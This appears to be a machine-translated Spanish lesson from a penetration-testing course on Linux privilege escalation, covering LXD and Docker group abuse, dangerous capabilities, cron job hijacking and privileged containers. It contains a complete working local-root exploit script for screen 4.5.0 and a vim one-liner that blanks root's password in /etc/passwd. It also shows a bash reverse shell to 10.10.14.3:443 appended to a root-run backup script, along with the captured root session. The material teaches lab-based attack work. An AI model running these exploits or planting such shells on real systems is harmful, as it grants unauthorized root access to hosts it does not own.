To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicie un contenedor privilegiado con el `security.privileged` establecer a `true` para ejecutar el contenedor sin un mapeo UID, haga que el usuario raíz en el contenedor sea el mismo que el usuario raíz en el host.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Monte el sistema de archivos host.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finalmente, genere una carcasa dentro de la instancia de contenedor. Ahora podemos navegar por el sistema de archivos host montado como root. Por ejemplo, para acceder al contenido del directorio raíz en el tipo de host `cd /mnt/root/root`. Desde aquí podemos leer archivos sensibles como `/etc/shadow` y obtenga hashes de contraseña u obtenga acceso a claves SSH para conectarse al sistema host como root, y más.

  Grupos Privilegiados

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

---

## Acoplador

Colocar un usuario en el grupo docker es esencialmente equivalente al acceso de nivel raíz al sistema de archivos sin requerir una contraseña. Los miembros del grupo docker pueden generar nuevos contenedores docker. Un ejemplo sería ejecutar el comando `docker run -v /root:/mnt -it ubuntu`. Este comando crea una nueva instancia Docker con el directorio /root en el sistema de archivos host montado como un volumen. Una vez que se inicia el contenedor, podemos navegar por el directorio montado y recuperar o agregar claves SSH para el usuario raíz. Esto podría hacerse para otros directorios como `/etc` que podría ser utilizado para recuperar el contenido de la `/etc/shadow` archivo para descifrar contraseñas fuera de línea o agregar un usuario privilegiado.

---

## Disco

Los usuarios dentro del grupo de discos tienen acceso completo a cualquier dispositivo contenido en el mismo `/dev`, como `/dev/sda1`, que es típicamente el dispositivo principal utilizado por el sistema operativo. Un atacante con estos privilegios puede usar `debugfs` para acceder a todo el sistema de archivos con privilegios de nivel raíz. Al igual que con el ejemplo del grupo Docker, esto podría aprovecharse para recuperar claves SSH, credenciales o para agregar un usuario.

---

## ADMIRAR

Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`. Esto no otorga acceso root directamente, pero podría aprovecharse para recopilar datos confidenciales almacenados en archivos de registro o enumerar las acciones del usuario y ejecutar trabajos cron.

  Grupos Privilegiados

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```


# Capacidades

---

Las capacidades de Linux son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, lo que les permite realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, lo que lo hace más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos.

Sin embargo, como cualquier característica de seguridad, las capacidades de Linux no son invulnerables y pueden ser explotadas por los atacantes. Una vulnerabilidad común es el uso de capacidades para otorgar privilegios a procesos que no están adecuadamente sandboxed o aislados de otros procesos, lo que nos permite escalar sus privilegios y obtener acceso a información confidencial o realizar acciones no autorizadas.

Otra vulnerabilidad potencial es el mal uso o el uso excesivo de las capacidades, lo que puede dar lugar a que los procesos tengan más privilegios de los que necesitan. Esto puede crear riesgos de seguridad innecesarios, ya que podríamos explotar estos privilegios para obtener acceso a información confidencial o realizar acciones no autorizadas.

En general, las capacidades de Linux pueden ser una característica de seguridad práctica, pero deben usarse con cuidado y correctamente para evitar vulnerabilidades y posibles exploits.

Establecer capacidades implica usar las herramientas y comandos apropiados para asignar capacidades específicas a ejecutables o programas. En Ubuntu, por ejemplo, podemos usar el `setcap` comando para establecer capacidades para ejecutables específicos. Este comando nos permite especificar la capacidad que queremos establecer y el valor que queremos asignar.

Por ejemplo, podríamos usar el siguiente comando para establecer el `cap_net_bind_service` capacidad para un ejecutable:

#### Establecer Capacidad

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando las capacidades se establecen para un binario, significa que el binario será capaz de realizar acciones específicas que no sería capaz de realizar sin las capacidades. Por ejemplo, si el `cap_net_bind_service` la capacidad se establece para un binario, el binario será capaz de enlazar a los puertos de red, que es un privilegio generalmente restringido.

Algunas capacidades, como `cap_sys_admin`, lo que permite a un ejecutable realizar acciones con privilegios administrativos, puede ser peligroso si no se utilizan correctamente. Por ejemplo, podríamos explotarlos para escalar sus privilegios, obtener acceso a información confidencial o realizar acciones no autorizadas. Por lo tanto, es crucial establecer este tipo de capacidades para ejecutables correctamente sandbox y aislados y evitar otorgarlos innecesariamente.

|**Capacidad**|**Descripción**|
|---|---|
|`cap_sys_admin`|Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar la configuración del sistema.|
|`cap_sys_chroot`|Permite cambiar el directorio raíz para el proceso actual, lo que le permite acceder a archivos y directorios que de otro modo serían inaccesibles.|
|`cap_sys_ptrace`|Permite adjuntar y depurar otros procesos, lo que potencialmente le permite obtener acceso a información confidencial o modificar el comportamiento de otros procesos.|
|`cap_sys_nice`|Permite aumentar o reducir la prioridad de los procesos, lo que potencialmente le permite obtener acceso a recursos que de otro modo estarían restringidos.|
|`cap_sys_time`|Permite modificar el reloj del sistema, lo que le permite manipular marcas de tiempo o hacer que otros procesos se comporten de manera inesperada.|
|`cap_sys_resource`|Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivos abiertos o la cantidad máxima de memoria que se puede asignar.|
|`cap_sys_module`|Permite cargar y descargar módulos del kernel, lo que le permite modificar el comportamiento del sistema operativo u obtener acceso a información confidencial.|
|`cap_net_bind_service`|Permite enlazar a puertos de red, lo que le permite acceder a información confidencial o realizar acciones no autorizadas.|

Cuando un binario se ejecuta con capacidades, puede realizar las acciones que permiten las capacidades. Sin embargo, no podrá realizar ninguna acción no permitida por las capacidades. Esto permite un control más preciso sobre los privilegios del binario y puede ayudar a prevenir vulnerabilidades de seguridad y acceso no autorizado a información confidencial.

Al usar el `setcap` comando para establecer capacidades para un ejecutable en Linux, necesitamos especificar la capacidad que queremos establecer y el valor que queremos asignar. Los valores que utilicemos dependerán de la capacidad específica que estemos configurando y de los privilegios que queramos otorgar al ejecutable.

Aquí hay algunos ejemplos de valores que podemos usar con el `setcap` comando, junto con una breve descripción de lo que hacen:

|**Valores de Capacidad**|**Descripción**|
|---|---|
|`=`|Este valor establece la capacidad especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos borrar una capacidad establecida previamente para el ejecutable.|
|`+ep`|Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad.|
|`+ei`|Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad y los procesos secundarios generados por el ejecutable para heredar la capacidad y realizar las mismas acciones.|
|`+p`|Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que permite la capacidad, pero no le permite realizar ninguna acción que no esté permitida por la capacidad. Esto puede ser útil si queremos otorgar la capacidad al ejecutable, pero evitar que herede la capacidad o permitir que los procesos secundarios la hereden.|

Se pueden usar varias capacidades de Linux para escalar los privilegios de un usuario a `root`, incluyendo:

|**Capacidad**|**Descripción**|
|---|---|
|`cap_setuid`|Permite que un proceso establezca su ID de usuario efectivo, que se puede usar para obtener los privilegios de otro usuario, incluido el `root` usuario.|
|`cap_setgid`|Permite establecer su ID de grupo efectivo, que se puede utilizar para obtener los privilegios de otro grupo, incluido el `root` grupo.|
|`cap_sys_admin`|Esta capacidad proporciona una amplia gama de privilegios administrativos, incluida la capacidad de realizar muchas acciones reservadas para el `root` usuario, como modificar la configuración del sistema y montar y desmontar sistemas de archivos.|
|`cap_dac_override`|Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos.|

---

## Enumerando Capacidades

Es importante tener en cuenta que estas capacidades deben usarse con precaución y solo otorgarse a procesos confiables, ya que pueden usarse incorrectamente para obtener acceso no autorizado al sistema. Para enumerar todas las capacidades existentes para todos los ejecutables binarios existentes en un sistema Linux, podemos usar el siguiente comando:

#### Enumerando Capacidades

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Esta línea única usa el `find` comando para buscar todos los ejecutables binarios en los directorios donde se encuentran típicamente y luego utiliza el `-exec` bandera para correr el `getcap` comando en cada uno, mostrando las capacidades que se han establecido para ese binario. La salida de este comando mostrará una lista de todos los ejecutables binarios en el sistema, junto con las capacidades que se han establecido para cada uno.

---

## Explotación

Si obtuvimos acceso al sistema con una cuenta de bajo privilegio, descubrimos el `cap_dac_override` capacidad:

#### Explotando Capacidades

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Por ejemplo, el `/usr/bin/vim.basic` binary se ejecuta sin privilegios especiales, como con `sudo`. Sin embargo, porque el binario tiene el `cap_dac_override` conjunto de capacidades, puede escalar los privilegios del usuario que lo ejecuta. Esto permitiría que el probador de penetración obtuviera el `cap_dac_override` capacidad y realizar tareas que requieren esta capacidad.

Echemos un vistazo a la `/etc/passwd` archivo donde el usuario `root` se especifica:

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos usar el `cap_dac_override` capacidad de la `/usr/bin/vim` binario para modificar un archivo del sistema:

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

También podemos hacer estos cambios en un modo no interactivo:

  Capacidades

```shell-session
vcrdcr@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
vcrdcr@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Ahora, podemos ver que el `x` en esa línea se ha ido, lo que significa que podemos usar el comando `su` para iniciar sesión como root sin que se le solicite la contraseña.


# Servicios Vulnerables

---

Se pueden encontrar muchos servicios, que tienen fallas que se pueden aprovechar para escalar privilegios. Un ejemplo es el popular multiplexor de terminales [Pantalla](https://linux.die.net/man/1/screen). La versión 4.5.0 sufre una vulnerabilidad de escalado de privilegios debido a la falta de una verificación de permisos al abrir un archivo de registro.

#### Identificación de la Versión de Pantalla

  Servicios Vulnerables

```shell-session
vcrdcr@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

Esto permite a un atacante truncar cualquier archivo o crear un archivo propiedad de root en cualquier directorio y, en última instancia, obtener acceso completo a root.

#### Escalada de Privilegios - Screen_Exploit.sh

  Servicios Vulnerables

```shell-session
vcrdcr@htb[/htb]$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

El siguiente script se puede utilizar para realizar este ataque de escalada de privilegios:

#### Pantalla_Exploit_POC.sh

Código: bash

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```


# Cron Abuso de Trabajo

---

Los trabajos de Cron también se pueden configurar para que se ejecuten una vez (como en el arranque). Por lo general, se utilizan para tareas administrativas, como ejecutar copias de seguridad, limpiar directorios, etc. El `crontab` el comando puede crear un archivo cron, que será ejecutado por el demonio cron en el horario especificado. Cuando se crea, el archivo cron se creará en `/var/spool/cron` para el usuario específico que lo crea. Cada entrada en el archivo crontab requiere seis elementos en el siguiente orden: minutos, horas, días, meses, semanas, comandos. Por ejemplo, la entrada `0 */12 * * * /home/admin/backup.sh` correría cada 12 horas.

El crontab raíz es casi siempre solo editable por el usuario raíz o un usuario con privilegios sudo completos; sin embargo, todavía se puede abusar. Puede encontrar un script de escritura mundial que se ejecute como root e, incluso si no puede leer el crontab para conocer el cronograma exacto, es posible que pueda determinar con qué frecuencia se ejecuta (es decir, un script de copia de seguridad que crea un `.tar.gz` archivo cada 12 horas). En este caso, puede agregar un comando al final del script (como un shell inverso de una línea), y se ejecutará la próxima vez que se ejecute el trabajo cron.

Ciertas aplicaciones crean archivos cron en el `/etc/cron.d` directorio y puede estar mal configurado para permitir que un usuario no root los edite.

Primero, veamos alrededor del sistema en busca de archivos o directorios escribibles. El archivo `backup.sh` en el `/dmz-backups` el directorio es interesante y parece que podría estar ejecutándose en un trabajo cron.

  Cron Abuso de Trabajo

```shell-session
vcrdcr@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

Una mirada rápida en el `/dmz-backups` el directorio muestra lo que parecen ser archivos creados cada tres minutos. Esto parece ser una mala configuración importante. Quizás el administrador de sistemas pretendía especificar cada tres horas como `0 */3 * * *` pero en cambio escribió `*/3 * * * *`, que le dice al cron trabajo que corra cada tres minutos. El segundo problema es que el `backup.sh` shell script es world writeable y se ejecuta como root.

  Cron Abuso de Trabajo

```shell-session
vcrdcr@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

Podemos confirmar que un trabajo cron se está ejecutando usando [pspy](https://github.com/DominicBreuker/pspy), una herramienta de línea de comandos utilizada para ver los procesos en ejecución sin la necesidad de privilegios de root. Podemos usarlo para ver comandos ejecutados por otros usuarios, cron jobs, etc. Funciona escaneando [procfs](https://en.wikipedia.org/wiki/Procfs).

Corramos `pspy` y echa un vistazo. El `-pf` flag le dice a la herramienta que imprima comandos y eventos del sistema de archivos y `-i 1000` le dice que escanee [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) cada 1000ms (o cada segundo).

  Cron Abuso de Trabajo

```shell-session
vcrdcr@htb[/htb]$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

Desde la salida anterior, podemos ver que un trabajo cron ejecuta el `backup.sh` script ubicado en el `/dmz-backups` directorio y creación de un archivo tarball del contenido del `/var/www/html` directorio.

Podemos mirar el script de shell y agregarle un comando para intentar obtener un shell inverso como root. Si edita un script, asegúrese de `ALWAYS` tome una copia del script y/o cree una copia de seguridad del mismo. También debemos intentar agregar nuestros comandos al final del script para que aún se ejecuten correctamente antes de ejecutar nuestro comando shell inverso.

  Cron Abuso de Trabajo

```shell-session
vcrdcr@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Podemos ver que el script solo está tomando un directorio de origen y destino como variables. A continuación, especifica un nombre de archivo con la fecha y hora actuales de la copia de seguridad y crea un tarball del directorio de origen, el directorio raíz web. Modifiquemos el script para agregar un [Bash shell inverso de una línea](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Código: bash

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Modificamos el script, levantamos un local `netcat` oyente, y espera. Efectivamente, en tres minutos, ¡tenemos un caparazón raíz!

  Cron Abuso de Trabajo

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

Si bien no es el ataque más común, encontramos trabajos cron mal configurados que pueden ser abusados de vez en cuando.



# Contenedores

---

Los contenedores funcionan a nivel de sistema operativo y las máquinas virtuales a nivel de hardware. Por lo tanto, los contenedores comparten un sistema operativo y aíslan los procesos de aplicación del resto del sistema, mientras que la virtualización clásica permite que múltiples sistemas operativos se ejecuten simultáneamente en un solo sistema.

El aislamiento y la virtualización son esenciales porque ayudan a administrar los recursos y los aspectos de seguridad de la manera más eficiente posible. Por ejemplo, facilitan el monitoreo para encontrar errores en el sistema que a menudo no tienen nada que ver con las aplicaciones recientemente desarrolladas. Otro ejemplo sería el aislamiento de procesos que generalmente requieren privilegios de root. Dicha aplicación podría ser una aplicación web o API que debe aislarse del sistema host para evitar la escalada a las bases de datos.

---

## Contenedores Linux

Contenedores de Linux (`LXC`) es una técnica de virtualización a nivel de sistema operativo que permite que múltiples sistemas Linux se ejecuten aislados entre sí en un solo host al poseer sus propios procesos pero compartiendo el núcleo del sistema host para ellos. LXC es muy popular debido a su facilidad de uso y se ha convertido en una parte esencial de la seguridad de TI.

Por defecto, `LXC` consuma menos recursos que una máquina virtual y tenga una interfaz estándar, lo que facilita la administración de múltiples contenedores simultáneamente. Una plataforma con `LXC` incluso se puede organizar a través de múltiples nubes, proporcionando portabilidad y asegurando que las aplicaciones que se ejecutan correctamente en el sistema del desarrollador funcionarán en cualquier otro sistema. Además, se pueden iniciar, detener o cambiar sus variables de entorno a través de la interfaz del contenedor de Linux.

La facilidad de uso de `LXC` es su ventaja más significativa en comparación con las técnicas clásicas de virtualización. Sin embargo, la enorme propagación de `LXC`, un ecosistema que abarca casi todo, y herramientas innovadoras se deben principalmente a la plataforma Docker, que estableció contenedores Linux. Toda la configuración, desde la creación de plantillas de contenedores y su implementación, la configuración del sistema operativo y la red, hasta la implementación de aplicaciones, sigue siendo la misma.

#### Daemon Linux

Daemon Linux ([LXD](https://github.com/lxc/lxd)) es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicación, sino un contenedor de sistema. Antes de que podamos usar este servicio para escalar nuestros privilegios, debemos estar en cualquiera de los dos `lxc` o `lxd` grupo. Podemos averiguarlo con el siguiente comando:

  Contenedores

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

A partir de ahora, ahora hay varias formas en que podemos explotar `LXC`/`LXD`. Podemos crear nuestro propio contenedor y transferirlo al sistema de destino o usar un contenedor existente. Desafortunadamente, los administradores a menudo usan plantillas que tienen poca o ninguna seguridad. Esta actitud tiene la consecuencia de que ya tenemos herramientas que podemos usar contra el sistema nosotros mismos.

  Contenedores

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Dichas plantillas a menudo no tienen contraseñas, especialmente si son entornos de prueba sin complicaciones. Estos deben ser rápidamente accesibles y sin complicaciones de usar. El enfoque en la seguridad complicaría toda la iniciación, la haría más difícil y, por lo tanto, la ralentizaría considerablemente. Si tenemos un poco de suerte y hay un contenedor de este tipo en el sistema, puede ser explotado. Para esto, necesitamos importar este contenedor como una imagen.

  Contenedores

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

Después de verificar que esta imagen se ha importado con éxito, podemos iniciar la imagen y configurarla especificando el `security.privileged` bandera y la ruta de la raíz para el contenedor. Esta bandera desactiva todas las características de aislamiento que nos permiten actuar en el host.

  Contenedores

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Una vez que lo hayamos hecho, podemos iniciar el contenedor e iniciar sesión en él. En el contenedor, podemos ir a la ruta que especificamos para acceder al `resource` del sistema host como `root`.

  Contenedores

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```


# Docker
---

Docker es una popular herramienta de código abierto que proporciona un entorno de tiempo de ejecución portátil y consistente para aplicaciones de software. Utiliza contenedores como entornos aislados en el espacio del usuario que se ejecutan a nivel del sistema operativo y comparten el sistema de archivos y los recursos del sistema. Una ventaja es que la contenedorización consume significativamente menos recursos que un servidor tradicional o una máquina virtual. La característica principal de Docker es que las aplicaciones están encapsuladas en los llamados contenedores Docker. Por lo tanto, se pueden utilizar para cualquier sistema operativo. Un contenedor Docker representa un paquete de software ejecutable independiente ligero que contiene todo lo necesario para ejecutar un código de aplicación en tiempo de ejecución.

---

## Docker Arquitectura

En el núcleo de la arquitectura Docker se encuentra un modelo cliente-servidor, donde tenemos dos componentes principales:

- El demonio Docker
- El cliente Docker

El cliente Docker actúa como nuestra interfaz para emitir comandos e interactuar con el ecosistema Docker, mientras que el demonio Docker es responsable de ejecutar esos comandos y administrar contenedores.

#### Daemon Docker

El `Docker Daemon`, también conocido como el servidor Docker, es una parte crítica de la plataforma Docker que desempeña un papel fundamental en la gestión y orquestación de contenedores. Piense en el Docker Daemon como la potencia detrás de Docker. Tiene varias responsabilidades esenciales como:

- funcionamiento de contenedores Docker
    
- interactuando con contenedores Docker
    
- gestión de contenedores Docker en el sistema host.
    

#### Gestión de contenedores Docker

En primer lugar, maneja la funcionalidad de contenedorización de núcleo. Coordina la creación, ejecución y monitoreo de contenedores Docker, manteniendo su aislamiento del host y otros contenedores. Este aislamiento garantiza que los contenedores funcionen de forma independiente, con sus propios sistemas de archivos, procesos e interfaces de red. Además, maneja la gestión de imágenes Docker. Extrae imágenes de registros, como [Hub Docker](https://hub.docker.com/) o repositorios privados, y los almacena localmente. Estas imágenes sirven como bloques de construcción para crear contenedores.

